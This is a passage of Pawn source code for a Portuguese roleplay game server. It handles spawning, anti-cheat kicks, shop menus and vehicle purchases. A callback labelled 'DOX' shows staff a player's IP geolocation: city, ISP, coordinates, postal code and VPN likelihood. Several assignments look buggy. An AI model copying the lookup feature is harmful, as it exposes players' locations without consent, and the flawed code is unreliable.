	new suid[32];
	
	SetPlayerInterior(playerid, 0);
	
	if(pInfo[playerid][Faction] == 0 && pInfo[playerid][ChaveCasa] == 0 && pInfo[playerid][ChaveCasaAlugada] == 0 && pInfo[playerid][SpawnX] == 0)
	{
		SetSpawnInfo(playerid, 0, pInfo[playerid][Skin], SpawnInfo[pInfo[playerid][Origem]][X], SpawnInfo[pInfo[playerid][Origem]][Y], SpawnInfo[pInfo[playerid][Origem]][Z], SpawnInfo[pInfo[playerid][Origem]][A], 0, 0, 0, 0, 0, 0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerInterior(playerid, 0);
	}
	else if(pInfo[playerid][Faction] != 0)
	{
		SetSpawnInfo(playerid, 0, pInfo[playerid][Skin], fInfo[pInfo[playerid][Faction]][X], fInfo[pInfo[playerid][Faction]][Y], fInfo[pInfo[playerid][Faction]][Z], fInfo[pInfo[playerid][Faction]][A], 0, 0, 0, 0, 0, 0);
		SetPlayerVirtualWorld(playerid, 0); 
		SetPlayerInterior(playerid, 0);
	}
	else if(pInfo[playerid][ChaveCasa] != 0)
	{
		SetSpawnInfo(playerid, 0, pInfo[playerid][Skin], hInfo[pInfo[playerid][ChaveCasa]][ExitX], hInfo[pInfo[playerid][ChaveCasa]][ExitY], hInfo[pInfo[playerid][ChaveCasa]][ExitZ], hInfo[pInfo[playerid][ChaveCasa]][ExitAngle], 0, 0, 0, 0, 0, 0);
		SetPlayerVirtualWorld(playerid, hInfo[pInfo[playerid][ChaveCasa]][VirtualWorld]);
		SetPlayerInterior(playerid, hInfo[pInfo[playerid][ChaveCasa]][Interior]);
	}
	else if(pInfo[playerid][ChaveCasaAlugada] != 0)
	{
		SetSpawnInfo(playerid, 0, pInfo[playerid][Skin], hInfo[pInfo[playerid][ChaveCasaAlugada]][ExitX], hInfo[pInfo[playerid][ChaveCasaAlugada]][ExitY], hInfo[pInfo[playerid][ChaveCasaAlugada]][ExitZ], hInfo[pInfo[playerid][ChaveCasaAlugada]][ExitAngle], 0, 0, 0, 0, 0, 0);
		SetPlayerVirtualWorld(playerid, hInfo[pInfo[playerid][ChaveCasaAlugada]][VirtualWorld]);
		SetPlayerInterior(playerid, hInfo[pInfo[playerid][ChaveCasaAlugada]][Interior]);
	}
	else if(pInfo[playerid][SpawnX] != 0)
	{
		SetSpawnInfo(playerid, 0, pInfo[playerid][Skin], SpawnInfo[pInfo[playerid][Origem]][X], SpawnInfo[pInfo[playerid][Origem]][Y], SpawnInfo[pInfo[playerid][Origem]][Z], SpawnInfo[pInfo[playerid][Origem]][A], 0, 0, 0, 0, 0, 0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerInterior(playerid, 0);
	}
	
	ResetPlayerMoney(playerid);
	
	SetPlayerScore(playerid, pInfo[playerid][Level]);
	GivePlayerMoney(playerid, GetPlayerMoneyEx(playerid));
 	SetPlayerColor(playerid, COLOR_WHITE);

 	StopAudioStreamForPlayer(playerid);
 	
 	Logged[playerid] = true;
	
    TogglePlayerSpectating(playerid, false);

 	if(pInfo[playerid][Admin] > 0)
	{
	    for(new i = 0; i < 52; i++)
	    {
			EnableAntiCheatForPlayer(playerid, i, 0);
		}
	}
	else
	{
		for(new i = 0; i < 52; i++)
	    {
			switch(i)
			{
			    case 0,1,2,3,4,5,6,18,59: { continue; }
			}
			
			EnableAntiCheatForPlayer(playerid, i, 1);
		}
	}

	if(pInfo[playerid][Morto] == 1)
	{
	    Morte(playerid);
	}

	PlayerPlaySound(playerid, 1186, 0.0, 0.0, 10.0);

	if(pInfo[playerid][TutFeito] == 0)
	{
		new sdialog[512];
		new string[128];

		format(string, sizeof(string), "{FFFFFF}Este servidor consiste em imitar a vida real ao máximo. Para isso precisas de fazer tudo o que normalmente uma pessoa"); strcat(sdialog,string);
		format(string, sizeof(string), "\n{FFFFFF}normal faz. Tal como um cidadão normal e com pleno juízo, terés de trabalhar para te sustentares. Tens ao teu alcance várias maneiras de ganhar"); strcat(sdialog,string);
		format(string, sizeof(string), "\n{FFFFFF}dinheiro, desde trabalhos até és Factions (legais ou ilegais). Com este dinheiro que futuramente ganharás, poderás adquirir carros, casas,"); strcat(sdialog,string);
		format(string, sizeof(string), "\n{FFFFFF}bens materiais, ir a festas e fazer tudo aquilo que te apetecer, respeitando sempre as regras do bom funcionamento do servidor."); strcat(sdialog,string);
		format(string, sizeof(string), "\n{FFFFFF}Mas lembra-te, tudo aquilo que não podes fazer na vida real também não podes fazer dentro do nosso servidor."); strcat(sdialog,string);
		format(string, sizeof(string), "\n{FFFFFF}Este é um pormenor importante do qual te deves sempre lembrar."); strcat(sdialog,string);

		UnlockTutorial[playerid] = false;
		SetTimerEx("UnlockTutorials", 10000, false, "i", playerid);

		return ShowPlayerDialog(playerid, DIALOG_TUTORIAL1, DIALOG_STYLE_MSGBOX, "TUTORIAL - Em que consiste o servidor", sdialog, "Próximo", "Sair");
	}

	// INTRO

	TextDrawHideForPlayer(playerid, TDEditor_TD[0]);
	TextDrawHideForPlayer(playerid, TDEditor_TD[1]);
	TextDrawHideForPlayer(playerid, TDEditor_TD[2]);
	TextDrawHideForPlayer(playerid, TDEditor_TD[3]);
	TextDrawHideForPlayer(playerid, TDEditor_TD[4]);
	TextDrawHideForPlayer(playerid, TDEditor_TD[5]);
	TextDrawHideForPlayer(playerid, TDEditor_TD[6]);

	// RELéGIO & STUFF

	TextDrawShowForPlayer(playerid, TDEditor_TDInGame[0]);
	TextDrawShowForPlayer(playerid, TDEditor_TDInGame[1]);
	TextDrawShowForPlayer(playerid, TDEditor_TDInGame[2]);
	TextDrawShowForPlayer(playerid, TDEditor_TDInGame[3]);
	TextDrawShowForPlayer(playerid, TDEditor_TDInGame[4]);
	TextDrawShowForPlayer(playerid, relogio);

	if(TimerGuardarJogador[playerid] == -1)
	{
		TimerGuardarJogador[playerid] = SetTimerEx("GuardarJogador", 120000, true, "i", playerid);
		TimerUpdateJogador[playerid] = SetTimerEx("UpdateJogador", 1000, true, "i", playerid);
	}

	format(suid, sizeof(suid), "{FF0000}[ {FF9900}%d {FF0000}]", pInfo[playerid][UID]);
	UIDLabel[playerid] = Create3DTextLabel(suid, COLOR_WHITE, 0, 0, 0, 70.0, 0, 1);
	Attach3DTextLabelToPlayer(UIDLabel[playerid], playerid, 0.0, 0.0, 0.5);
	
	SpawnPlayer(playerid);
	
	if(pInfo[playerid][Morto] == 1)
	{
	    Morte(playerid);
	}
	
	return 1;
}

public MenosDrunk(playerid)
{
    DrunkLevel[playerid]--;
    
	if(DrunkLevel[playerid] == 0)
	{
		KillTimer(TimerDrunk[playerid]);
		SetPlayerDrunkLevel(playerid, 0);
	}
	
	return 1;
}

public OnCheatDetected(playerid, ip_address[], type, code)
{
	if(AntiSpamAC[playerid] == 0)
	{
		new string[128];
		new cheat[64];

		switch(code)
		{
		    case 0: { cheat = "Air Break (a pé)"; }
		    case 1: { cheat = "Air Break (no carro)"; }
		    case 2: { cheat = "Teleport Hack (a pé)"; }
		    case 3: { cheat = "Teleport Hack (no carro)"; }
		    case 4: { cheat = "Teleport Hack (entre carros)"; }
		    case 5: { cheat = "Teleport Hack (carro para jogador)"; }
		    case 6: { cheat = "Teleport Hack (pickups)"; }
		    case 7: { cheat = "Fly Hack (a pé)"; }
		    case 8: { cheat = "Fly Hack (no carro)"; }
		    case 9: { cheat = "Speed Hack (a pé)"; }
		    case 10: { cheat = "Speed Hack (no carro)"; }
		    case 11: { cheat = "Health Hack (no carro)"; }
		    case 12: { cheat = "Health Hack (a pé)"; }
		    case 13: { cheat = "Armour Hack"; }
		    case 14: { cheat = "Money Hack"; }
		    case 15: { cheat = "Weapon Hack"; }
		    case 16,17: { cheat = "Ammo Hack"; }
		    case 18: { cheat = "Special Actions Hack"; }
		    case 19: { cheat = "Godmode (a pé)"; }
		    case 20: { cheat = "Godmode (no carro)"; }
		    case 21: { cheat = "Invisible Hack"; }
		    case 22: { cheat = "Lag Compensation Spoof"; }
		    case 23: { cheat = "Tuning Hack"; }
		    case 24: { cheat = "Parkour Hack"; }
		    case 25: { cheat = "Quick Turn Hack"; }
		    case 26: { cheat = "Rapid Fire Hack"; }
		    case 27: { cheat = "Fake Spawn Hack"; }
		    case 28: { cheat = "Fake Kill Hack"; }
		    case 29: { cheat = "Pro Aim Hack"; }
		    case 30: { cheat = "CJ Run Hack"; }
		    case 31: { cheat = "CarShot"; }
		    case 32: { cheat = "CarJack"; }
		    case 33: { cheat = "Unfreeze Hack"; }
		    case 34: { cheat = "AFK Ghost"; }
		    case 35: { cheat = "Full Aiming"; }
		    case 36: { cheat = "Fake NPC"; }
		    case 37: { cheat = "Reconnect Hack"; }
		    case 38: { cheat = "High Ping Hack"; }
		    case 39: { cheat = "Dialog Hack"; }
		    case 40: { cheat = "Sandbox Protection"; }
		    case 41: { cheat = "Invalid Version"; }
		    case 42: { cheat = "Rcon BruteForce"; }
		    case 43: { cheat = "Tuning Crasher"; }
		    case 44: { cheat = "Invalid Seat Crasher"; }
		    case 45: { cheat = "Dialog Crasher"; }
		    case 46: { cheat = "Object Attatched"; }
		    case 47: { cheat = "Weapon Crasher"; }
		    case 48: { cheat = "Flood Protection"; }
		    case 49: { cheat = "Callbacks Flood"; }
		    case 50: { cheat = "Seat Change"; }
		    case 51: { cheat = "Anti DDoS"; }
		    case 52: { cheat = "Anti NOP's"; }
		}
		
		format(string, sizeof(string), "%s", cheat);
		
		HackLog(playerid, string);
		
		return KickPlayer(playerid, "Doge", string);
	}
	
	return 1;
}

public RotaMensagem(playerid, msg[])
{
	new string[128];

	format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}%s.", msg);
	SendClientMessage(playerid, COLOR_CHAT, string);

	return 1;
}

public PausarRota(playerid, msg[], ms)
{
	new string[128];
	
	format(string, sizeof(string), "%s.", msg);
    PlayerActionMessage(playerid, 15.0, string);
    
    TogglePlayerControllable(playerid, false);
    
    SetTimerEx("DespausarRota", ms, false, "i", playerid);
    
	return 1;
}

public DespausarRota(playerid)
{
    PlayerActionMessage(playerid, 15.0, "segue viagem.");

    TogglePlayerControllable(playerid, true);
    
	return 1;
}

public Streamer_OnPluginError(error[])
{
    ErrorLog(error);
    
	return 1;
}

public OnMenuResponse(playerid, menuid, response, listitem)
{
	if(response == 2)
	{
		if(menuid == MenuArmas)
		{
		    new nome[32];
		    new price;
		    new string[128];

			switch(listitem)
			{
			    case 0:
			    {
					price = GetWeapPrice(4);
					nome  = GetWeapName(4);
			    }
			    case 1:
			    {
					price = GetWeapPrice(8);
					nome  = GetWeapName(8);
			    }
			    case 2:
			    {
					price = GetWeapPrice(22);
					nome  = GetWeapName(22);
			    }
			    case 3:
			    {
					price = GetWeapPrice(23);
					nome  = GetWeapName(23);
			    }
			    case 4:
			    {
					price = GetWeapPrice(24);
					nome  = GetWeapName(24);
			    }
			    case 5:
			    {
					price = GetWeapPrice(25);
					nome  = GetWeapName(25);
			    }
			    case 6:
			    {
					price = GetWeapPrice(29);
					nome  = GetWeapName(29);
			    }
			    case 7:
			    {
					price = GetWeapPrice(30);
					nome  = GetWeapName(30);
			    }
			    case 8:
			    {
					price = GetWeapPrice(41);
					nome  = GetWeapName(11);
			    }
			}
			TogglePlayerControllable(playerid, true);
			
			format(string, sizeof(string), "Nome da Arma: {FFFFFF}%s", nome);
			SendClientMessage(playerid, COLOR_CHAT, string);
			format(string, sizeof(string), "Preço: {FFFFFF}%d$", price);
			SendClientMessage(playerid, COLOR_CHAT, string);
		}
	}
	
	return 1;
}

public CarregarMenus()
{
	new tick1;
	new tick2;

	tick1 = GetTickCount();
	
    MenuArmas = Menu_Create("Armas", COLOR_ORANGE);
    Menu_AddItem(MenuArmas, "Faca");
    Menu_AddItem(MenuArmas, "Katana");
    Menu_AddItem(MenuArmas, "Pistola 9mm");
    Menu_AddItem(MenuArmas, "Pistola 9mm c/ Silenciador");
	Menu_AddItem(MenuArmas, "Desert Eagle");
	Menu_AddItem(MenuArmas, "Shotgun");
	Menu_AddItem(MenuArmas, "MP5");
	Menu_AddItem(MenuArmas, "Kalashnikov AK-47");
	Menu_AddItem(MenuArmas, "Gas Pimenta");
	
	tick2 = GetTickCount();
    printf("\n [PC:RP] Menus carregados (%d ms)", tick2-tick1);
    
	return 1;
}

public OnPlayerCommandReceived(playerid,cmdtext[]) // This callback is called before the actual command function is called.
{
	Tickbefore[playerid] = GetTickCount();
    
	return CMD_SUCCESS;
}

public OnPlayerCommandPerformed(playerid, cmdtext[], success) // This callback is called after the command function is executed.
{
	if(success != CMD_SUCCESS)
    {
    	new stringcmd[128];

        format(stringcmd, sizeof(stringcmd), "[ERRO:] {FFFFFF}O comando {AA3333}%s {FFFFFF}não existe.", cmdtext);
        SendClientMessage(playerid, COLOR_ERRO, stringcmd);
    }
    else
	{
	    sStats[0][Comandos]++;
	}

	CMDLog(playerid, cmdtext);
	
	Tickafter[playerid] = GetTickCount();
	
	if(Tickbefore[playerid] <= Tickafter[playerid] && Tickafter[playerid]-Tickbefore[playerid] < 5000)
	{
		TickTotal += Tickafter[playerid]-Tickbefore[playerid];
		TickCount++;
		
		if(DebugStatus[playerid] == true)
		{
			new stringcmd[128];

			format(stringcmd, sizeof(stringcmd), "[DEBUG:] {FFFFFF}Comando executado em %d ms", floatround(Tickafter[playerid]-Tickbefore[playerid], floatround_round));
			SendClientMessage(playerid, COLOR_RED, stringcmd);
		}
	}
	
    return CMD_SUCCESS;
}

public OnPlayerModelSelection(playerid, response, listid, modelid)
{
	if(listid == ListaSkins)
	{
	    if(!response) return 1;
	    if(GetPlayerMoneyEx(playerid) < PRECO_SKIN) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	    
		pInfo[playerid][Skin] = modelid;
		SetPlayerSkin(playerid, modelid);
		GivePlayerMoneyEx(playerid, -PRECO_SKIN);
		
		PlayerActionMessage(playerid, 15.0, "escolhe uma roupa e compra-a.");
		
		ApplyActorAnimation(BizActor[GetPlayerVirtualWorld(playerid)], "INT_SHOP", "shop_cashier", 4.1, 0, 0, 0, 0, 3000);
	}
	if(listid == ListaAcessorios)
	{
	    if(!response) return 1;
	    if(GetPlayerMoneyEx(playerid) < PRECO_ACESSORIO) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	    
	    ApplyActorAnimation(BizActor[GetPlayerVirtualWorld(playerid)], "INT_SHOP", "shop_cashier", 4.1, 0, 0, 0, 0, 3000);
	    
	    switch(modelid)
	    {
			case 2054:
			{
			    pObjects[playerid][o_2054] = 1;
			    SendClientMessage(playerid, COLOR_INFO, "Compraste um Chapéu de Marinheiro");
			}
			case 18639:
			{
			    pObjects[playerid][o_18639] = 1;
			    SendClientMessage(playerid, COLOR_INFO, "Compraste um Chapéu de Cowboy");
			}
 			case 18943:
			{
                pObjects[playerid][o_18943] = 1;
                SendClientMessage(playerid, COLOR_INFO, "Compraste um Chapéu Verde");
			}
			case 18939:
			{
                pObjects[playerid][o_18939] = 1;
                SendClientMessage(playerid, COLOR_INFO, "Compraste um Chapéu Preto");
			}
			case 2053:
			{
                pObjects[playerid][o_2053] = 1;
                SendClientMessage(playerid, COLOR_INFO, "Compraste um Chapéu Soldado");
			}
			case 2052:
			{
                pObjects[playerid][o_2052] = 1;
                SendClientMessage(playerid, COLOR_INFO, "Compraste um Chapéu Normal");
			}
			case 19160:
			{
                pObjects[playerid][o_19160] = 1;
                SendClientMessage(playerid, COLOR_INFO, "Compraste um Chapéu Normal 2");
			}
			case 18940:
			{
                pObjects[playerid][o_18940] = 1;
                SendClientMessage(playerid, COLOR_INFO, "Compraste um Chapéu Azul");
			}
			case 18941:
			{
                pObjects[playerid][o_18941] = 1;
                SendClientMessage(playerid, COLOR_INFO, "Compraste um Chapéu Preto");
			}
 			case 19006:
			{
                pObjects[playerid][o_19006] = 1;
                SendClientMessage(playerid, COLOR_INFO, "Compraste óculos");
			}
 			case 19027:
			{
                pObjects[playerid][o_19027] = 1;
                SendClientMessage(playerid, COLOR_INFO, "Compraste óculos");
			}
 			case 19007:
			{
                pObjects[playerid][o_19007] = 1;
                SendClientMessage(playerid, COLOR_INFO, "Compraste óculos");
			}
 			case 19009:
			{
                pObjects[playerid][o_19009] = 1;
                SendClientMessage(playerid, COLOR_INFO, "Compraste óculos");
			}
  			case 19010:
			{
                pObjects[playerid][o_19010] = 1;
                SendClientMessage(playerid, COLOR_INFO, "Compraste óculos");
			}
  			case 19011:
			{
                pObjects[playerid][o_19011] = 1;
                SendClientMessage(playerid, COLOR_INFO, "Compraste óculos");
			}
   			case 19012:
			{
                pObjects[playerid][o_19012] = 1;
                SendClientMessage(playerid, COLOR_INFO, "Compraste óculos");
			}
   			case 19013:
			{
                pObjects[playerid][o_19013] = 1;
                SendClientMessage(playerid, COLOR_INFO, "Compraste óculos");
			}
  			case 19014:
			{
                pObjects[playerid][o_19014] = 1;
                SendClientMessage(playerid, COLOR_INFO, "Compraste óculos");
			}
   			case 19015:
			{
                pObjects[playerid][o_19015] = 1;
                SendClientMessage(playerid, COLOR_INFO, "Compraste óculos");
			}
   			case 19016:
			{
                pObjects[playerid][o_19016] = 1;
                SendClientMessage(playerid, COLOR_INFO, "Compraste óculos");
			}
  			case 19017:
			{
                pObjects[playerid][o_19017] = 1;
                SendClientMessage(playerid, COLOR_INFO, "Compraste óculos");
			}
   			case 19018:
			{
                pObjects[playerid][o_19018] = 1;
                SendClientMessage(playerid, COLOR_INFO, "Compraste óculos");
			}
	    }
	    GivePlayerMoneyEx(playerid, -100);
	    PlayerActionMessage(playerid, 15.0, "escolhe um acessório e compra-o.");
	}
	if(listid == ListaObjetos)
	{
	    if(!response) return 1;
	    new nome[32];
		new price = GetObjectPrice(modelid);

		nome  = GetObjectName(modelid);

		new string[128];

		format(string, sizeof(string), "Nome: {FFFFFF}%s", nome);
		SendClientMessage(playerid, COLOR_CHAT, string);
		format(string, sizeof(string), "Preço: {FFFFFF}%d$", price);
		SendClientMessage(playerid, COLOR_CHAT, string);
	}
	if(listid == ListaObjetosComprar)
	{
	    if(!response) return 1;
	    new price = GetObjectPrice(modelid);
	    new string[128];
	    
	    if(GetPlayerMoneyEx(playerid) < price) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	    
	    ApplyActorAnimation(BizActor[GetPlayerVirtualWorld(playerid)], "INT_SHOP", "shop_cashier", 4.1, 0, 0, 0, 0, 3000);

		switch(modelid)
		{
		    case 330: { pObjects[playerid][WalkieTalkie] = 1; format(string, sizeof(string), "Compraste %s por %d$", GetObjectName(modelid), price); }
			case 336: { GivePlayerWeapon(playerid, 5, 0); format(string, sizeof(string), "Compraste %s por %d$", GetObjectName(modelid), price); }
			case 1650: { pObjects[playerid][Bidom] = 1; format(string, sizeof(string), "Compraste %s por %d$", GetObjectName(modelid), price); }
			case 3026: { pObjects[playerid][Mochila] = 1; format(string, sizeof(string), "Compraste %s por %d$", GetObjectName(modelid), price); }
			case 1210: { pObjects[playerid][Mala] = 1; format(string, sizeof(string), "Compraste %s por %d$", GetObjectName(modelid), price); }
			case 2824: { pObjects[playerid][ListaTel] = 1; format(string, sizeof(string), "Compraste %s por %d$", GetObjectName(modelid), price); }
			case 2895: { GivePlayerWeapon(playerid, 14, 0); format(string, sizeof(string), "Compraste %s por %d$", GetObjectName(modelid), price); }
			case 19163: { pObjects[playerid][Mascara] = 1; format(string, sizeof(string), "Compraste %s por %d$", GetObjectName(modelid), price); }
			case 19088: { pObjects[playerid][Corda] = 1; format(string, sizeof(string), "Compraste %s por %d$", GetObjectName(modelid), price); }
			case 18974: { pObjects[playerid][Venda] = 1; format(string, sizeof(string), "Compraste %s por %d$", GetObjectName(modelid), price); }
			case 18976: { pObjects[playerid][Capacete] = 1; format(string, sizeof(string), "Compraste %s por %d$", GetObjectName(modelid), price); }
			case 18632: { pObjects[playerid][CanaDePesca] = 1; format(string, sizeof(string), "Compraste %s por %d$", GetObjectName(modelid), price); }
		}
		
		GivePlayerMoneyEx(playerid, -price);
		
		SendClientMessage(playerid, COLOR_INFO, string);

		PlayerActionMessage(playerid, 15.0, "escolhe um objeto e compra-o.");
		
        ApplyActorAnimation(BizActor[GetPlayerVirtualWorld(playerid)], "INT_SHOP", "shop_cashier", 4.1, 0, 0, 0, 0, 3000);
	}
	if(listid == ListaCarros)
	{
	    if(!response) return 1;
	    new nome[32];
		new price = GetStandPrice(modelid);
		
		nome  = GetStandName(modelid);
		
		new string[128];
		
		format(string, sizeof(string), "Nome do veículo: {FFFFFF}%s", nome);
		SendClientMessage(playerid, COLOR_CHAT, string);
		format(string, sizeof(string), "Preço: {FFFFFF}%d$", price);
		SendClientMessage(playerid, COLOR_CHAT, string);
	}
	if(listid == ListaCarrosComprar)
	{
	    if(!response) return 1;
	    new price = GetStandPrice(modelid);
	    new string[128];
	    
		if(pInfo[playerid][ChaveCarro1] == 0 || pInfo[playerid][ChaveCarro2] == 0 || pInfo[playerid][ChaveCarro3] == 0 || pInfo[playerid][ChaveCarro4] == 0)
		{
  			if(pInfo[playerid][Golds] > 0)
			{
                if(GetPlayerMoneyEx(playerid) < (floatround(price / 2, floatround_round))) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
			}
			else
			{
			    if(GetPlayerMoneyEx(playerid) < price) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
			}
  			
		    for(new c = 0; c < MAX_CARROS; c++)
			{
				new model = GetVehicleModel(c);
			    if(model != 510) continue;
			    if(model == 508 || model == 454 && pInfo[playerid][ChaveCasa] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens uma casa!");

				cInfo[c][Model] = modelid;
	   			cInfo[c][Faction] = 0;
	   			cInfo[c][Type] = -1;
	   			if(IsBoat(modelid))
	   			{
				    cInfo[c][X] = STANDBARCO_X;
				    cInfo[c][X] = STANDBARCO_Y;
				    cInfo[c][Z] = STANDBARCO_Z;
				    cInfo[c][Angle] = STANDBARCO_A;
	   			}
	   			else
	   			{
				    cInfo[c][X] = STAND_X;
				    cInfo[c][X] = STAND_Y;
				    cInfo[c][Z] = STAND_Z;
				    cInfo[c][Angle] = STAND_A;
	   			}
			    cInfo[c][Color1] = 1;
			    cInfo[c][Color1] = 1;
			    cInfo[c][Comprado] = 1;
                format(cInfo[c][Prop], 32, "%s", GetPlayerNameEx(playerid));
                format(cInfo[c][CompradoEm], 32, "%s", GetCurrentDate());
				cInfo[c][Travao] = 0;
				cInfo[c][Kilometros] = 0;
				cInfo[c][Metros] = 0;
				cInfo[c][Neon] = 0;
				cInfo[c][NeonStatus] = 0;
				cInfo[c][Gasolina] = 100;
				cInfo[c][Vida] = 1000;
				cInfo[c][mod1] = 0;
				cInfo[c][mod2] = 0;
				cInfo[c][mod3] = 0;
				cInfo[c][mod4] = 0;
				cInfo[c][mod5] = 0;
				cInfo[c][mod6] = 0;
				cInfo[c][mod7] = 0;
				cInfo[c][mod8] = 0;
				cInfo[c][mod9] = 0;
				cInfo[c][mod10] = 0;
				cInfo[c][mod11] = 0;
				cInfo[c][Apreendido] = 0;
				cInfo[c][Arma1] = 0;
				cInfo[c][Ammo1] = 0;
				cInfo[c][Arma2] = 0;
				cInfo[c][Ammo2] = 0;
				cInfo[c][Arma3] = 0;
				cInfo[c][Ammo3] = 0;
				cInfo[c][RadioStatus] = 0;
				cInfo[c][IsCaravana] = 0;
				cInfo[c][CaravanaCasaID] = 0;

			    GuardarCarro(c);
			    DestroyVehicle(cInfo[c][ID]);
			    
			    IsARespawn[c] = true;
				cInfo[c][ID] = CreateVehicle(cInfo[c][Model], cInfo[c][X], cInfo[c][Y], cInfo[c][Z], cInfo[c][Angle], cInfo[c][Color1], cInfo[c][Color2], -1, IsACopCar(cInfo[c][Model]) ? 1 : 0);
				SetVehicleVirtualWorld(cInfo[c][ID], cInfo[c][VirtualWorld]);
				LinkVehicleToInterior(cInfo[c][ID], cInfo[c][Interior]);
				AtualizarDanosCarro(c);
	
			    SetVehiclePosEx(cInfo[c][ID], STAND_X, STAND_Y, STAND_Z);

				if(pInfo[playerid][Golds] > 0)
				{
					GivePlayerMoneyEx(playerid, -(floatround(price / 2, floatround_round)));
				}
				else
				{
					GivePlayerMoneyEx(playerid, -price);
				}
    			PlayerActionMessage(playerid, 15.0, "passa o cartão de crédito na máquina e recebe a chave do carro.");

				format(string, sizeof(string), "Compraste o carro %d. Tira print desta mensagem por percaução.", c);
				SendClientMessage(playerid, COLOR_INFO, string);
				
				sStats[0][CarrosComprados]++;

                if(pInfo[playerid][ChaveCarro1] == 0)
				{
				    pInfo[playerid][ChaveCarro1] = c;
				}
				else if(pInfo[playerid][ChaveCarro2] == 0)
				{
				    pInfo[playerid][ChaveCarro2] = c;
				}
				else if(pInfo[playerid][ChaveCarro3] == 0)
				{
                    pInfo[playerid][ChaveCarro3] = c;
				}
				else if(pInfo[playerid][ChaveCarro4] == 0)
				{
                    pInfo[playerid][ChaveCarro4] = c;
				}
				
				if(modelid == 508 || modelid == 454) // caravana
				{
					for(new i = 0; i < MAX_CASAS; i++)
					{
					    if(i == 0) continue;
					    if(hInfo[i][Price] != 0) continue;
					    
				    	hInfo[i][Comprada] = 1;
						hInfo[i][Locked] = 0;
						hInfo[i][PickupID] = 19133;
						hInfo[i][AluguerStatus] = 0;
						hInfo[i][Aluguer] = 0;
						hInfo[i][Price] = 999999;
					 	format(hInfo[i][Nome], 32, "%s", "Caravana");
					  	format(hInfo[i][Owner], 32, "%s", GetPlayerNameEx(playerid));
						hInfo[i][ExitX] = 223.043991;
						hInfo[i][ExitY] = 1289.259888;
						hInfo[i][ExitZ] = 1082.199951;
						hInfo[i][Interior] = 1;
						hInfo[i][EnterInterior] = 0;

					  	pInfo[playerid][ChaveCasa] = i;
					  	
					  	if(modelid == 508)
					  	{
						  	cInfo[c][IsCaravana] = 1;
						  	cInfo[c][CaravanaCasaID] = i;
							hInfo[i][IsCaravana] = 1;
							hInfo[i][CarroCaravanaID] = c;
							hInfo[i][ExitX] = 2392.7415;
							hInfo[i][ExitY] = -1714.5696;
							hInfo[i][ExitZ] = -46.7258;
							hInfo[i][Interior] = 0;
							
							return SendClientMessage(playerid, COLOR_INFO, "Compraste uma caravana. Para o pickup da casa aparecer, faz /estacionar em qualquer sítio.");
					  	}
					  	else
					  	{
						  	cInfo[c][IsCaravana] = 2;
						  	cInfo[c][CaravanaCasaID] = i;
							hInfo[i][IsCaravana] = 2;
							hInfo[i][CarroCaravanaID] = c;
							hInfo[i][ExitX] = 1612.906738;
							hInfo[i][ExitY] = 613.277405;
							hInfo[i][ExitZ] = 2.310597;
							hInfo[i][Interior] = 0;
							
							return SendClientMessage(playerid, COLOR_INFO, "Compraste um barco habitável. Para o pickup da casa aparecer, faz /estacionar em qualquer sítio.");
					  	}
					}
				}
				return 1;
			}
		}
		else return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens chaves disponíveis");
	}

	return 1;
}

public HttpDox(index, response_code, data[])
{
    if(response_code == 200)
    {
        if(strfind(data, "Undefined index", true) != -1 || strfind(data, "Error", true) != -1)
        {
			SendClientMessage(index, COLOR_ERRO, "[ERRO:] {FFFFFF}Erro ao obter informações sobre esse IP.");
			return 1;
        }

    	new output[13][64], sdialog[512];
    	
    	new isVPN = strval(output[12]);
    	new vpnMessage[32];
    	
    	switch(isVPN)
    	{
    	    case 0: format(vpnMessage, sizeof(vpnMessage), "{00FF00}Muito pouco provável");
    	    case 1: format(vpnMessage, sizeof(vpnMessage), "{209120}Pouco provável");
    	    case 2: format(vpnMessage, sizeof(vpnMessage), "{E8A42E}Provável");
    	    case 3: format(vpnMessage, sizeof(vpnMessage), "{F7752F}Muito provável");
    	    case 4: format(vpnMessage, sizeof(vpnMessage), "{FF0000}Certo");
    	}
    	
		explode(output, data, "'");
		format(sdialog, sizeof(sdialog),
		"Index\tValor\n\
		IP\t%s\n\
		Internet Username\t%s\n\
		City\t%s\n\
		Country\t%s\n\
		Country Code\t%s\n\
		ISP\t%s\n\
		Latitude\t%s\n\
		Longitude\t%s\n\
		Org\t%s\n\
		Region Name\t%s\n\
		Código Postal\t%s\n\
		VPN/Proxy\t%s", output[8], output[0], output[1], output[2], output[3], output[4], output[5], output[6], output[7], output[9], output[10], vpnMessage);

		ShowPlayerDialog(index, 6156, DIALOG_STYLE_TABLIST_HEADERS, "{FFFF00}DOX", sdialog, "Ok", "");
    }
    else
    {
        new string[256];
		
  		format(string, sizeof(string), "[ERRO:] {FFFFFF}Erro ao obter informações sobre esse IP. (Código: %d) (%s)", response_code, data);
  		SendClientMessage(index, COLOR_ERRO, string);
    }

    return 1;
}

public AddVehicleComponentEx(vehicleid, componentid)
{
	switch(componentid)
	{
	    case 1025,1073..1085,1096..1098: // Wheels
	    {
	        cInfo[vehicleid][mod9] = componentid;
	        AddVehicleComponent(vehicleid, componentid);
	    }
	    case 1109,1110, 1115,1116,1123: // Bullbars
	    {
	        cInfo[vehicleid][mod8] = componentid;
	        AddVehicleComponent(vehicleid, componentid);
	    }
	    case 1007,1017,1026,1027,1030,1031,1036,1039..1042,1047,1048,1051,1052,1056,1057,1062,1063,1069..1072,1090,1093..1095,1099,1101,1102,1106..1108,1118..1122,1124,1133,1134,1137: // Sideskirts
	    {
	        cInfo[vehicleid][mod7] = componentid;
	        AddVehicleComponent(vehicleid, componentid);
	    }
	    case 1006,1032,1033,1035,1038,1053..1055,1061,1067,1068,1088,1091,1103,1128,1130,1131: // Roofs
	    {
	        cInfo[vehicleid][mod5] = componentid;
	        AddVehicleComponent(vehicleid, componentid);
	    }
	    case 1140,1141, 1148..1151,1154,1156,1159,1161,1167,1168,1175,1177,1178,1180,1183,1184,1186,1187,1192,1193: // Rear Bumpers
		{
